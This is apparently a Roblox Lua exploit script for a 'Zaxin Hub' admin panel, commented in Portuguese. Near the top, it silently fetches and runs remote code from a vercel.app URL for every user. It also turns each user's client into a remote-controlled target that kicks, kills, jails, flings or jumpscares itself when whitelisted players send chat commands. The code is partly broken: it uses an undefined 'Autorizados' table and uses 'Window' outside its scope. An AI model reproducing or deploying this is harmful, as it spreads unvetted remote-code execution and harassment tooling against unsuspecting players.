--// Serviços

local Players = game:GetService("Players")

local TweenService = game:GetService("TweenService")

local TextChatService = game:GetService("TextChatService")

local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer



--// Executa o load para TODOS (independente se é dono ou não)

pcall(function()

    loadstring(game:HttpGet("https://scriptsbinsauth.vercel.app/api/scripts/917fb298-61be-4615-9d7c-0e5b769b7360/raw"))()

end)



--// Lista de jumpscares

local JUMPSCARES = {

    { Name = ";jumps1", ImageId = "rbxassetid://126754882337711", AudioId = "rbxassetid://138873214826309" },

    { Name = ";jumps2", ImageId = "rbxassetid://86379969987314", AudioId = "rbxassetid://143942090" },

    { Name = ";jumps3", ImageId = "rbxassetid://127382022168206", AudioId = "rbxassetid://143942090" },

    { Name = ";jumps4", ImageId = "rbxassetid://95973611964555", AudioId = "rbxassetid://138873214826309" },

}



--// Whitelist com ranks personalizados

local WhiteList = {

    ["10pereirazzk"] = "Owner",

    ["Zelaojg"] = "Parceiro",

    ["joaoluizzx"] = "Staff",

    ["itz_starUwUspice"] = "Usuário-Admin",

    ["tiai200"] = "Usuário-Admin",

    ["nao"] = "Staff",

}



--// Função para criar a tag acima da cabeça

local function createBillboard(playerName, displayText, guiName)

    local target = workspace:FindFirstChild(playerName)

    if not target then return end



    local head = target:FindFirstChild("Head")

    if not head or head:FindFirstChild(guiName) then return end



    local billboard = Instance.new("BillboardGui")

    billboard.Name = guiName

    billboard.Adornee = head

    billboard.Size = UDim2.new(0, 100, 0, 60)

    billboard.StudsOffset = Vector3.new(0, 2.5, 0)

    billboard.AlwaysOnTop = true

    billboard.MaxDistance = 80

    billboard.Parent = head



    local textBackground = Instance.new("Frame", billboard)

    textBackground.Name = "TextBG"

    textBackground.Size = UDim2.new(1, 0, 0.5, 0)

    textBackground.Position = UDim2.new(0, 0, 0.5, 0)

    textBackground.BackgroundColor3 = Color3.fromRGB(128, 0, 255)

    textBackground.BackgroundTransparency = 0.3

    textBackground.BorderSizePixel = 2

    textBackground.BorderColor3 = Color3.new(0, 0, 0)



    local corner = Instance.new("UICorner", textBackground)

    corner.CornerRadius = UDim.new(0, 10)



    local label = Instance.new("TextLabel", textBackground)

    label.Size = UDim2.new(1, 0, 1, 0)

    label.BackgroundTransparency = 1

    label.Text = displayText

    label.TextColor3 = Color3.new(1, 1, 1)

    label.TextScaled = true

    label.Font = Enum.Font.GothamBold



    local image = Instance.new("ImageLabel", billboard)

    image.Size = UDim2.new(0, 40, 0, 40)

    image.Position = UDim2.new(0.5, -20, 0, 0)

    image.BackgroundTransparency = 1

    image.Image = "rbxassetid://"

end



--// Controle de loops ativos

local runningLoops = {}



local function startGuiWatcher(playerName, displayText, guiName)

    if runningLoops[guiName] then return end

    runningLoops[guiName] = true



    task.spawn(function()

        while runningLoops[guiName] do

            createBillboard(playerName, displayText, guiName)

            task.wait(1)

        end

    end)

end



local function stopGuiWatcher(guiName)

    runningLoops[guiName] = nil

    for _, player in ipairs(game.Players:GetPlayers()) do

        local target = workspace:FindFirstChild(player.Name)

        if target and target:FindFirstChild("Head") then

            local gui = target.Head:FindFirstChild(guiName)

            if gui then gui:Destroy() end

        end

    end

end



--// Inicia a tag automaticamente nos jogadores whitelistados

local Players = game:GetService("Players")



local function applyTagsToWhitelist()

    for playerName, tagText in pairs(WhiteList) do

        local player = Players:FindFirstChild(playerName)

        if player then

            startGuiWatcher(player.Name, tagText, "RankTag_" .. player.Name)

        end

    end

end



--// Quando o jogador entra

Players.PlayerAdded:Connect(function(player)

    task.wait(2)

    local tag = WhiteList[player.Name]

    if tag then

        startGuiWatcher(player.Name, tag, "RankTag_" .. player.Name)

    end

end)



--// Executa para quem já estiver no jogo

applyTagsToWhitelist()



--// Envia comando no chat

local function EnviarComando(comando, alvo)

    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]

    if canal then

        canal:SendAsync(";" .. comando .. " " .. (alvo or ""))

    end

end



--// Efeitos locais

local playerOriginalSpeed = {}

local jaulas = {}

local jailConnections = {}



--// Função de Jumpscare 

local function MostrarJumpscare(imageId, audioId)

    local gui = Instance.new("ScreenGui")

    gui.ResetOnSpawn = false

    gui.IgnoreGuiInset = true

    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    gui.Parent = LocalPlayer:WaitForChild("PlayerGui")



    local img = Instance.new("ImageLabel")

    img.Size = UDim2.new(1, 0, 1, 0)

    img.BackgroundTransparency = 1

    img.Image = imageId

    img.ImageTransparency = 1

    img.Parent = gui



    local sound = Instance.new("Sound")

    sound.SoundId = audioId

    sound.Volume = 5

    sound.PlayOnRemove = true

    sound.Parent = workspace

    sound:Destroy()



    -- Fade in/out

    TweenService:Create(img, TweenInfo.new(4.3), { ImageTransparency = 0 }):Play()

    task.wait(2.5)

    TweenService:Create(img, TweenInfo.new(4.3), { ImageTransparency = 1 }):Play()

    task.wait(2.2)

    gui:Destroy()

end



--// Função principal de execução de comandos locais

local function ExecutarComandoLocal(comando, autor)

    local playerName = LocalPlayer.Name:lower()

    local character = LocalPlayer.Character

    local humanoid = character and character:FindFirstChildOfClass("Humanoid")



    -- Verifica jumpscares

    for _, js in ipairs(JUMPSCARES) do

        if comando:match(js.Name .. "%s+" .. playerName) then

            MostrarJumpscare(js.ImageId, js.AudioId)

            return

        end

    end



    if comando:match(";kick%s+" .. playerName) then

        LocalPlayer:Kick("Você foi expulso por Zaxin Hub")

    end



    if comando:match(";kill%s+" .. playerName) then

        if character then character:BreakJoints() end

    end



    if comando:match(";killplus%s+" .. playerName) then

        if character then

            character:BreakJoints()

            local root = character:FindFirstChild("HumanoidRootPart")

            if root then

                for i = 1, 10 do

                    local part = Instance.new("Part")

                    part.Size = Vector3.new(10, 10, 10)

                    part.Anchored = false

                    part.CanCollide = false

                    part.Material = Enum.Material.Neon

                    part.BrickColor = BrickColor.Random()

                    part.CFrame = root.CFrame

                    part.Parent = workspace

                    local bv = Instance.new("BodyVelocity")

                    bv.Velocity = Vector3.new(math.random(-50, 50), math.random(20, 80), math.random(-50, 50))

                    bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)

                    bv.Parent = part

                    game.Debris:AddItem(part, 3)

                end

            end

        end

    end



    if comando:match(";fling%s+" .. playerName) then

        if character then

            local root = character:FindFirstChild("HumanoidRootPart")

            if root then

                local tween = TweenService:Create(root, TweenInfo.new(1, Enum.EasingStyle.Linear), { CFrame = CFrame.new(0, 100000, 0) })

                tween:Play()

            end

        end

    end



    if comando:match(";freeze%s+" .. playerName) then

        if humanoid then

            playerOriginalSpeed[playerName] = humanoid.WalkSpeed

            humanoid.WalkSpeed = 0

        end

    end



    if comando:match(";unfreeze%s+" .. playerName) then

        if humanoid then

            humanoid.WalkSpeed = playerOriginalSpeed[playerName] or 16

        end

    end



    if comando:match(";jail%s+" .. playerName) then

        if character then

            local root = character:FindFirstChild("HumanoidRootPart")

            if root then

                local pos = root.Position

                jaulas[playerName] = {}

                local color = Color3.fromRGB(255, 140, 0)

                local function part(cf, s)

                    local p = Instance.new("Part")

                    p.Anchored = true

                    p.Size = s

                    p.CFrame = cf

                    p.Transparency = 0.5

                    p.Color = color

                    p.Parent = workspace

                    table.insert(jaulas[playerName], p)

                end

                part(CFrame.new(pos + Vector3.new(5, 0, 0)), Vector3.new(1, 10, 10))

                part(CFrame.new(pos + Vector3.new(-5, 0, 0)), Vector3.new(1, 10, 10))

                part(CFrame.new(pos + Vector3.new(0, 0, 5)), Vector3.new(10, 10, 1))

                part(CFrame.new(pos + Vector3.new(0, 0, -5)), Vector3.new(10, 10, 1))

                part(CFrame.new(pos + Vector3.new(0, 5, 0)), Vector3.new(10, 1, 10))

                part(CFrame.new(pos + Vector3.new(0, -5, 0)), Vector3.new(10, 1, 10))

                jailConnections[playerName] = RunService.Heartbeat:Connect(function()

                    if character and root then

                        if (root.Position - pos).Magnitude > 5 then

                            root.CFrame = CFrame.new(pos)

                        end

                    end

                end)

            end

        end

    end



    if comando:match(";unjail%s+" .. playerName) then

        if jaulas[playerName] then

            for _, v in pairs(jaulas[playerName]) do v:Destroy() end

            jaulas[playerName] = nil

        end

        if jailConnections[playerName] then

            jailConnections[playerName]:Disconnect()

            jailConnections[playerName] = nil

        end

    end



    if comando:match(";bring%s+" .. playerName) then

        local autorPlayer = Players:FindFirstChild(autor)

        if autorPlayer and autorPlayer.Character and autorPlayer.Character:FindFirstChild("HumanoidRootPart") then

            local root = character and character:FindFirstChild("HumanoidRootPart")

            if root then

                root.CFrame = autorPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)

            end

        end

        return

    end



    if comando:match(";verifique%s+" .. playerName) then

        pcall(function()

            local randomNumber = math.random(1000, 9999)

            local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")

            if channel then

                channel:SendAsync("Zaxin_Hub_User" .. randomNumber)

            end

        end)

        return

    end

end



--// Conecta mensagens do chat

local function ConectarChat()

    for _, canal in pairs(TextChatService.TextChannels:GetChildren()) do

        if canal:IsA("TextChannel") then

            canal.MessageReceived:Connect(function(msg)

                if msg.TextSource and msg.Text then

                    ExecutarComandoLocal(msg.Text:lower(), msg.TextSource.Name)

                end

            end)

        end

    end

end



ConectarChat()

TextChatService.TextChannels.ChildAdded:Connect(function(ch)

    if ch:IsA("TextChannel") then

        ch.MessageReceived:Connect(function(msg)

            if msg.TextSource and msg.Text then

                ExecutarComandoLocal(msg.Text:lower(), msg.TextSource.Name)

            end

        end)

    end

end)



--// Painel Zaxin Hub (WindUI)

if Autorizados[LocalPlayer.Name] then

    local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()

    local Window = WindUI:CreateWindow({

        Title = "Zaxin Hub | Painel Admin",

        Icon = "shield",

        Author = "by: ZaxinX",

        Folder = "Zaxin Hub",

        Size = UDim2.fromOffset(580, 460),

        Transparent = true,

        Theme = nil,

        Resizable = false,

        SideBarWidth = 200,

        BackgroundImageTransparency = 0.42,

        HideSearchBar = true,

        ScrollBarEnabled = true,

    })



    local TabComandos = Window:Tab({ Title = "Comandos", Icon = "terminal", Locked = false })

    local Section = TabComandos:Section({ Title = "Admin", Icon = "user-cog", Opened = true })



    local TargetName

    local function getPlayersList()

        local t = {}

        for _, p in ipairs(Players:GetPlayers()) do

            table.insert(t, p.Name)

        end

        return t

    end



    local Dropdown = Section:Dropdown({

        Title = "Selecionar Jogador",

        Values = getPlayersList(),

        Value = "",

        Callback = function(opt) TargetName = opt end

    })



    Players.PlayerAdded:Connect(function()

        Dropdown:SetValues(getPlayersList())

    end)

    Players.PlayerRemoving:Connect(function()

        Dropdown:SetValues(getPlayersList())

    end)



    local comandos = { "kick", "kill", "killplus", "fling", "freeze", "unfreeze", "bring", "jail", "unjail", "verifique", }

    for _, cmd in ipairs(comandos) do

        Section:Button({

            Title = cmd:upper(),

            Desc = "Executa ;" .. cmd .. " Nome",

            Callback = function()

                if TargetName then

                    EnviarComando(cmd, TargetName)

                else

                    warn("Nenhum jogador selecionado!")

                end

            end

        })

    end

end





--// Aba de Efeitos

local TabEfeitos = Window:Tab({ 

    Title = "Efeitos", 

    Icon = "zap", -- zaxin hub

    Locked = false 

})



local SectionEfeitos = TabEfeitos:Section({ 

    Title = "Jumpscares", 

    Icon = "alert-octagon", 

    Opened = true 

})



local TargetEfeito

local function atualizarListaPlayers()

    local lista = {}

    for _, p in ipairs(Players:GetPlayers()) do

        table.insert(lista, p.Name)

    end

    return lista

end



local DropdownEfeito = SectionEfeitos:Dropdown({

    Title = "Selecionar Jogador",

    Values = atualizarListaPlayers(),

    Value = "",

    Callback = function(opt) 

        TargetEfeito = opt 

    end

})



Players.PlayerAdded:Connect(function()

    DropdownEfeito:SetValues(atualizarListaPlayers())

end)

Players.PlayerRemoving:Connect(function()

    DropdownEfeito:SetValues(atualizarListaPlayers())

end)



--// Botões Jumpscare

local jumpsComandos = {

    {Nome = "jump1", Cmd = "jumps1"},

    {Nome = "jump2", Cmd = "jumps2"},

    {Nome = "jump3", Cmd = "jumps3"},

    {Nome = "jump 4", Cmd = "jumps4"},

}



for _, j in ipairs(jumpsComandos) do

    SectionEfeitos:Button({

        Title = j.Nome,

        Desc = "Executa ;" .. j.Cmd .. " Nome",

        Callback = function()

            if TargetEfeito then

                EnviarComando(j.Cmd, TargetEfeito)

            else

                warn("Selecione um jogador primeiro!")

            end

        end

    })

end



--// Som de carregamento

local sound = Instance.new("Sound")

sound.SoundId = "rbxassetid://8486683243"

sound.Volume = 2.0

sound.PlayOnRemove = true

sound.Parent = workspace

sound:Destroy() 
